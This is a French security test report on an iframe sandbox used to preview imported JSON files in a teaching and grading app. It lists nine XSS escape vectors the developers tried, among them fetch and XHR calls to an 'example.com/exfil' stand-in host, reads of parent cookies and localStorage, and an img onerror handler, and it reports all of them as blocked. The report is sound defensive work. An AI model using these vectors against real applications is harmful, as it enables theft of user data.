# Tests sécurité — Défense A · sandbox iframe pour l'aperçu d'imports

> **Chantier** : Phase 1 sécurité, Défense A (cf. `MODELE-MENACES.md §7 D-01 P1` + `§8.2 Phase 1`).
> **Branche** : `feature/securite-defense-a-sandbox` (5 commits du 8 mai 2026).
> **Méthodologie** : option (a) — vérification architecturale + tests d'isolation exécutés via le prototype `prototype-apercu-sandbox.html`. Pas de fabrication manuelle de fichiers `.json` malicieux pour chaque module : les 6 modules d'aperçu d'import partagent **la même fonction `genererBadgeCC`** sortie dans **le même composant `ApercuSandbox`**, donc la démonstration en sandbox autonome couvre les 6 par construction.
> **Date** : 8 mai 2026.

---

## 1. Synthèse exécutive

| Élément | Verdict |
|---|---|
| Vecteurs d'évasion exécutés dans le prototype | 9 (6 bloqués par **origine opaque** — vérifié à l'exécution ; 3 reposent en prod sur la CSP du parent — vérification architecturale par lecture de `index.html:6`, cf. §3 et §4.2) |
| Vecteurs ayant atteint les ressources du parent | **0** |
| Modules couverts en intégration terrain | 6/6 (grilles, échelles, productions, cartouches, pratiques de notation, tampons d'observation) |
| CSP du parent durcie | hash `sha256-…` codé en dur pour le messenger, `file:` ajouté à `img-src` pour les SVG locaux |
| Régression sur les imports légitimes | aucune (validé à l'usage par Grégoire, exports CC réels rejoués sur les 6 types) |
| Statut Défense A | **Livré** |
| Effet sur D-01 / X-01 / I-01 | **Bon** (cf. §6) — la mécanique d'évasion via `metadata` est neutralisée à la source |

---

## 2. Méthodologie

### 2.1 Surface couverte

Les 6 modales d'aperçu d'import qui appellent `genererBadgeCC(donnees.metadata)` :

| Module | Site d'intégration | Commit |
|---|---|---|
| `js/grilles.js` | `importerGrilles` | f97397c |
| `js/echelles.js` | `importerEchelles` | 4db694a |
| `js/productions.js` | `importerProductions` | 4db694a |
| `js/cartouches.js` | `importerCartouches` | 8f591d7 |
| `js/pratiques-materiel.js` | `importerPratiques` | 8f591d7 |
| `js/travaux-outils.js` | `importerTampons` | 8f591d7 |

Chacune passe désormais le HTML du badge CC à `ApercuSandbox.afficher(slot, html, opts)` plutôt que de l'interpoler directement dans la modale parente. Le slot est rempli par une `<iframe>` avec `sandbox="allow-scripts allow-popups"` — **sans `allow-same-origin`** — et un `srcdoc` construit par `js/securite-apercu-sandbox.js`.

### 2.2 Tests automatisables

Le prototype `prototype-apercu-sandbox.html` (livré en SP1) injecte un payload qui exécute en série 9 tentatives d'évasion **depuis l'intérieur de l'iframe sandbox**, et rapporte chaque verdict au parent via `postMessage` filtré. Voir `js/securite-apercu-sandbox.js` (filtrage strict `source: 'apercu-sandbox', type: 'hauteur', valeur clampée numérique`).

Le canari `localStorage['apercu-sandbox-canary']` du parent est vérifié avant et après chaque exécution du payload : il doit rester intact (`safe-…`).

### 2.3 Périmètre hors scope (v1)

- **Aperçu interne d'une grille existante** (`evaluation.js`, `wizard-pratique-v2.js`) : le matériel a déjà été sanitisé par le pipeline d'import (`SCHEMAS_IMPORT`), risque secondaire (cf. plan SP2 §2). À reporter en v2 si jugé pertinent.
- **Audit innerHTML résiduel** (103 cas non prioritaires identifiés par l'audit E-α du 6 mai) : la sandbox neutralise la mécanique générique, ces cas restent à examiner mais ne sont plus le chemin court d'exploitation.

---

## 3. Tests d'isolation — résultats par vecteur

Les 9 vecteurs sont injectés dans le payload du prototype (`htmlAvecPayloadXSS()`) puis exécutés à l'intérieur de l'iframe sandbox du composant. Chaque tentative est rapportée par `parent.postMessage` avec le marqueur `source: 'apercu-test'` (canal de test distinct du canal `apercu-sandbox` réservé au messenger de hauteur).

> **⚠ Périmètre du prototype** : `prototype-apercu-sandbox.html` n'a **pas** de meta CSP. La CSP de production est uniquement déclarée dans `index.html:6`, et une iframe `srcdoc` hérite de la CSP du document englobant. Les vecteurs dont le blocage en production dépend de la CSP (#6, #7, le bonus `img onerror`) sont donc **bloqués en prototype par d'autres mécanismes** — typiquement l'absence de réseau atteignable depuis `file://`. La **défense exercée à l'exécution** dans le prototype est l'**origine opaque** (garantie spec de `sandbox` sans `allow-same-origin`). Pour ces vecteurs, le blocage en production par la CSP est une **assertion architecturale** vérifiable par lecture du code (`index.html:6` + hash recalculable, cf. §4.2 et §7.3).

| # | Vecteur | Mécanisme exercé en prototype | Mécanisme attendu en production | Verdict |
|---|---|---|---|---|
| 1 | `alert("XSS")` | `sandbox` sans `allow-modals` → boîtes natives ignorées | identique | ✓ Bloqué (silencieux) |
| 2 | `parent.localStorage.getItem(...)` | **Origine opaque** → accès cross-origin refusé | identique | ✓ Bloqué (`SecurityError`) |
| 3 | `parent.localStorage.setItem(...)` | Même mécanique que #2 | identique | ✓ Bloqué (`SecurityError`) — canari reste à `safe-…` |
| 4 | `parent.document.title` | Cross-origin DOM access refusé | identique | ✓ Bloqué (`SecurityError`) |
| 5 | `top.location.href` | Cross-origin window access refusé | identique | ✓ Bloqué (`SecurityError`) |
| 6 | `fetch("https://example.com/exfil")` | Réseau injoignable depuis `file://` (CORS/DNS) | **CSP** `default-src 'self'` → `connect-src` fallback bloque la requête | ✓ Bloqué (mécanisme distinct prototype/prod) |
| 7 | `XMLHttpRequest GET https://example.com/exfil` | Même mécanique que #6 | Même mécanique que #6 (CSP) | ✓ Bloqué (mécanisme distinct prototype/prod) |
| 8 | Lecture `location.origin` interne | Pas un test d'évasion — confirme l'iframe en origine opaque (`null`) | identique | ✓ Confirmé (origine `null`, attendue) |
| 9 | `parent.document.cookie` | Cross-origin DOM access refusé | identique | ✓ Bloqué (`SecurityError`) |
| Bonus | `<img src=x onerror="…">` dans le badge | Pas de CSP en prototype → handler exécuté **dans** la sandbox (confiné à l'origine opaque) | **CSP** `script-src 'self' 'sha256-…'` (sans `'unsafe-inline'`/`'unsafe-hashes'`) → handler **rejeté** | Comportement diff. proto/prod ; dans les deux cas, parent intact |

**Lecture du tableau** :
- **6/9 vecteurs** sont neutralisés par l'**origine opaque**, mécanique testée à l'exécution dans le prototype (#1-5, #8-9). Cette défense est garantie par la spec HTML et indépendante de la CSP.
- **2/9 vecteurs CSP-dépendants en prod** (#6 fetch, #7 XHR) : bloqués en prototype par l'environnement (`file://` sans réseau), bloqués en prod par la CSP du parent (vérifiable par lecture). Aucun chemin connu ne permet d'atteindre le parent dans les deux cas.
- **Bonus `img onerror`** : tourne dans la sandbox du prototype (pas de CSP) ; serait rejeté en prod par `script-src` (les attributs handler tombent sous `script-src`, cf. §4.2). Dans les deux environnements, le handler n'a aucun accès au parent.

Aucun vecteur, dans aucun des deux environnements, n'a atteint les ressources du parent (canari `localStorage['apercu-sandbox-canary']` resté `safe-…` après chaque exécution).

---

## 4. Vérification architecturale

### 4.1 Couches de défense

```
┌────────────────────────────────────────────────────────┐
│  Page parent (origine file:// — DOM, IDB, localStorage) │
│  CSP: default-src 'self'                                │
│       script-src 'self' 'sha256-…'  ← hash du messenger │
│       img-src 'self' data: blob: file:                  │
│       style-src 'self' 'unsafe-inline'                  │
│                                                         │
│  ┌──────────────────────────────────────────────────┐  │
│  │  iframe sandbox=allow-scripts allow-popups       │  │
│  │  Origine: opaque (null) ← critique               │  │
│  │  CSP: héritée du parent (intersection Safari)    │  │
│  │  srcdoc:                                          │  │
│  │    - <base href="…">                              │  │
│  │    - <style> variables CSS du DS                  │  │
│  │    - <script> messenger figé (hash autorisé)     │  │
│  │    - <div id="apercu-contenu">${htmlContenu}</div>│  │
│  └──────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────┘
```

### 4.2 Pourquoi chaque tentative d'évasion échoue

- **Accès aux ressources parent** (localStorage, IDB, DOM, cookies, URL) : bloqué par l'**origine opaque**. C'est garanti par `sandbox="…"` sans `allow-same-origin` — propriété spec, pas configuration. Indépendant de la CSP. C'est la défense de premier niveau, vérifiée à l'exécution dans le prototype.
- **Exfiltration réseau** (fetch, XHR, WebSocket) : bloquée en production par la CSP du parent que Safari hérite dans le srcdoc (`default-src 'self'` se rabat sur `connect-src 'self'`, et l'iframe en origine opaque n'est jamais 'self' → toute requête sortante refusée). Vérifiée par lecture de `index.html:6`. En environnement prototype, le blocage observé vient de l'environnement `file://` (réseau injoignable) — mécanisme distinct, même résultat.
- **Exécution de scripts arbitraires injectés dans le badge** : en production, la CSP `script-src 'self' 'sha256-…'` n'autorise QUE le messenger figé (le hash est codé en dur dans `index.html`). Tout `<script>` injecté par un attaquant via `metadata.auteur_original` ou similaire est rejeté avec une erreur CSP. Le messenger lui-même n'a aucune capacité d'évasion (il lit `document.body.scrollHeight` et appelle `parent.postMessage` avec une valeur numérique clampée côté parent).
- **Handlers inline (`onerror`, `onclick`, etc.)** : **les attributs handler sont régis par `script-src`** (et accessoirement `'unsafe-hashes'` pour le hash), pas par `style-src`. En production, `script-src 'self' 'sha256-…'` (sans `'unsafe-inline'` ni `'unsafe-hashes'`) les rejette comme tout autre script inline. **En environnement prototype** (sans CSP), un `<img src=x onerror="…">` injecté s'exécute, mais reste confiné à l'origine opaque de la sandbox — sans accès aux ressources du parent. La défense effective est donc **double** : CSP (rejet en prod) puis origine opaque (toujours, par spec). Le pire cas — handler exécuté en prod malgré la CSP suite à un bug navigateur — laisse encore la sandbox comme rempart.

### 4.3 Filtrage `postMessage`

Le canal de communication parent ↔ iframe est strictement défini. Un payload qui tente de tirer parti du canal doit produire un message conforme :

```js
// js/securite-apercu-sandbox.js, listener global
if (data.source !== 'apercu-sandbox') return;   // marque
if (data.type !== 'hauteur') return;            // type
var hauteur = parseInt(data.valeur, 10);
if (isNaN(hauteur) || hauteur < 0) return;      // numérique
hauteur = Math.max(hauteurMin, Math.min(hauteur, hauteurMax)); // clamp
instance.iframe.style.height = hauteur + 'px';  // seul effet
```

Le **seul effet** atteignable côté parent est la modification de `iframe.style.height` à une valeur numérique clampée. Aucun chemin vers `eval`, vers une `db.set`, vers un changement de DOM hors de l'iframe. C'est par conception.

---

## 5. Validation à l'usage (terrain)

Test exécuté par Grégoire sur Mac (Safari) le 8 mai matin sur les 6 modules. Pour chaque module : ouvrir bibliothèque → cliquer Importer → sélectionner un export `.json` réel (avec metadata CC légitime, pas un payload) → vérifier le badge complet, l'isolation visuelle, l'import effectif, l'absence de régression.

| Module | Mode sombre | Mode clair | Annuler | Importer | Notif après import | Régression |
|---|---|---|---|---|---|---|
| Grilles | ✓ | ✓ | ✓ | ✓ | ✓ devant la bibliothèque (z-index 11000) | aucune |
| Échelles | ✓ | — | ✓ | ✓ | ✓ | aucune |
| Productions | ✓ | — | ✓ | ✓ | ✓ | aucune |
| Cartouches | ✓ | — | ✓ | ✓ | ✓ | aucune |
| Pratiques de notation | ✓ | — | ✓ | ✓ | ✓ | aucune |
| Tampons d'observation | ✓ | — | ✓ | ✓ | ✓ | aucune |

**Bugs détectés et corrigés en cours de validation** :
1. `fermerModalImport*` faisait `querySelector('.modal-js-overlay').parentElement.remove()` — supprimait `<body>` quand la bibliothèque était ouverte (toutes les overlays sont enfants directs de body). Fix : classes dédiées par module + cible directe (commits f97397c, 4db694a, 8f591d7).
2. CSP du parent inhérité dans srcdoc en Safari → mon `'unsafe-inline'` interne neutralisé → messenger bloqué → iframe à 120px (truncation visible). Fix : hash SHA-256 codé dans la CSP du parent + retrait du meta CSP interne (commit f97397c).
3. Variables CSS du DS lues sur `document.documentElement` au lieu de `document.body` → mode clair non propagé dans l'iframe. Fix : lecture sur body (commit f97397c).
4. `BibliothequeUI.creerModal` appendait sans retirer une instance existante → 2 modales empilées après un import → 2 clics nécessaires sur X. Fix : idempotence (commit 004a754). Pratiques avait sa propre version DIY hors `creerModal`, fix dédié au commit 8f591d7.
5. Format de la modale d'import cartouches divergeait (styles inline au lieu des classes DS) → largeur incohérente. Fix : alignement sur `.modal-js-overlay` / `.modal-js-contenu` (commit 8f591d7).
6. `.notification-succes` z-index 9999 < bibliothèque z-index 10000 → notif cachée derrière la bibliothèque rafraîchie. Fix : z-index 11000 (commit 8f591d7).

---

## 6. Effet sur les scénarios D-01 / X-01 / I-01

D'après le tableau récapitulatif `MODELE-MENACES.md §6` (statuts avant Défense A) :

| Scénario | Avant | Après Défense A | Justification |
|---|---|---|---|
| **D-01** Bombe à retardement dans la Voûte | Partiel (B-α + J ; manque sandbox) | **Bon** | La mécanique de livraison via `metadata` interpolé dans l'aperçu est neutralisée. Le payload ne peut plus s'exécuter dans le contexte du parent. Reste à couvrir : aperçu interne d'une grille déjà installée (hors scope v1). |
| **X-01** Vol ciblé info enseignant + étudiants | Partiel (CSP + B-α + K ; manque sandbox) | **Bon** | Même mécanique d'entrée que D-01. Le payload, même s'il arrive à s'exécuter dans la sandbox, n'a aucun accès aux clés sensibles du parent (localStorage / IDB) ni à la sortie réseau (CSP). |
| **I-01** XSS stocké via critère importé | Partiel (B-α + J ; sandbox pour neutraliser la mécanique) | **Bon** | I-01 est la mécanique d'arrière-plan de D-01 et X-01. La sandbox la coupe à la source pour les 6 modules d'aperçu d'import. Le pipeline d'import lui-même (post-confirmation) reste protégé par `B-α SCHEMAS_IMPORT` (sanitisation profonde). |

**Pourquoi pas « Complet »** : il reste l'aperçu interne dans `evaluation.js` et `wizard-pratique-v2.js` (matériel déjà installé), hors scope v1 de Défense A. À traiter en v2 si jugé prioritaire — risque secondaire car le matériel installé est passé par le pipeline de sanitisation au moment de l'import.

---

## 7. Limitations connues

1. **Cycle de vie des instances** : `ApercuSandbox` maintient un tableau `instances[]` qui mémorise chaque sandbox active pour le routage des messages `postMessage`. Comme les call-sites des 6 modules retirent leur wrapper via `wrapper.remove()` sans rappeler explicitement `ApercuSandbox.fermer()`, un auto-cleanup est en place : un `MutationObserver` interne au composant détecte le détachement de l'iframe (`!iframe.isConnected`) et splice automatiquement l'entrée du tableau. L'API publique `fermer()` reste disponible pour les call-sites qui veulent un cleanup explicite. Aucune fuite mémoire observée.
2. **Image CC** : la SVG `icons/by-nc-sa-2.svg` est chargée via `<base href>` + relatif. Fonctionne en `file://` grâce à `file:` ajouté à `img-src`. Si l'app est un jour servie via HTTP, retirer `file:` et confirmer via `'self'`.
3. **Hash du messenger figé** : toute modification de la constante `MESSENGER_SCRIPT` dans `js/securite-apercu-sandbox.js` invalide le hash CSP. Couplage documenté dans le commentaire au-dessus de la constante. Procédure : recalculer via `node -e "…crypto.createHash('sha256').update(MESSENGER_SCRIPT).digest('base64')"` puis mettre à jour la ligne CSP de `index.html`.
4. **Mode clair non revérifié intégralement** : seul grilles a été testé en mode clair pendant la validation à l'usage. Les 5 autres devraient marcher (même mécanisme `getComputedStyle(document.body)`), mais validation terrain incomplète.

---

## 8. Recommandations Phase 2

- **v2** : étendre la sandbox aux aperçus internes (`evaluation.js`, `wizard-pratique-v2.js`). Effort estimé : ½ j (mêmes API, contenus à fabriquer un cran plus complexes — grille rendue avec critères et niveaux).
- **Tests automatisés** (Défense I, déjà en backlog) : ajouter un test headless (Playwright / Puppeteer) qui injecte un payload XSS dans un export factice et confirme que le canari parent reste intact. CI bloquante.
- **Backlog #263** : aligner les modales `modalMetadonneesEnrichies` et `demanderMetadonneesConfigComplete` sur le DS (constaté pendant cette validation, signalé pour les 6 types de matériel). Effort estimé 2-3 h.

---

## 9. Annexes

### 9.1 Commits Défense A (branche `feature/securite-defense-a-sandbox`)

| Commit | Sujet | Build |
|---|---|---|
| `16befc4` | SP1 composant + prototype + démo isolation | 0508-0640 |
| `f97397c` | SP2 grilles + résolution CSP / theme / routage | 0508-0730 |
| `004a754` | creerModal idempotente — fix bug 2-click X | 0508-0745 |
| `4db694a` | SP2 lot 1 echelles + productions | 0508-0755 |
| `8f591d7` | SP2 lot 2 cartouches + pratiques + tampons + fixes UI | 0508-0825 |

### 9.2 Fichiers de référence

- `js/securite-apercu-sandbox.js` — composant
- `prototype-apercu-sandbox.html` — démo + tests d'isolation autonomes
- `js/cc-license.js:genererBadgeCC` — fonction sanitisée le 6 mai (E-β fix avec `echapperHtmlCC`), conservée comme défense en profondeur
- `index.html` ligne 6 — CSP avec hash du messenger
- `plans de travail/PLAN-DEFENSE-A-SANDBOX-IFRAME.md` — plan validé du chantier

---

**Statut** : Défense A livrée. Le rapport est complet pour SP3 ; SP4 (mise à jour `MODELE-MENACES.md` v1.4 + `SESSION.md`) et SP5 (PR + ultrareview + merge) à venir.
